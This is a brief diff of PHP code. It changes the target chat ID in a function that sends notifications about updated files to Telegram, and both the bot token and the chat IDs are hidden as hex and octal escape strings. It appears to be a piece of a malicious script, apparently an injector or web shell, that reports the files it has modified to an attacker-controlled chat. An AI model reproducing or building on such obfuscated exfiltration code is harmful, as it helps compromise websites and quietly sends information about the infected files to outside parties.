@@ -64,7 +64,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     function sendTelegramNotification($updatedFiles)
 {
     $botToken = "\x37\x32\70\x38\x35\x33\60\x30\x35\x36\x3a\101\x41\110\x33\x6d\166\x6a\125\x33\167\x6c\x39\64\x41\151\166\106\130\x62\130\62\130\127\110\x34\x4f\165\x67\x36\x63\x37\64\x67\171\x38";
-    $chatId = "\55\61\x30\x30\x32\x34\62\67\x33\70\67\70\63\70";
+    $chatId = "\55\x31\x30\60\62\x33\x31\x36\x36\x33\66\63\x34\x37";
 
     $processedPaths = [];
 
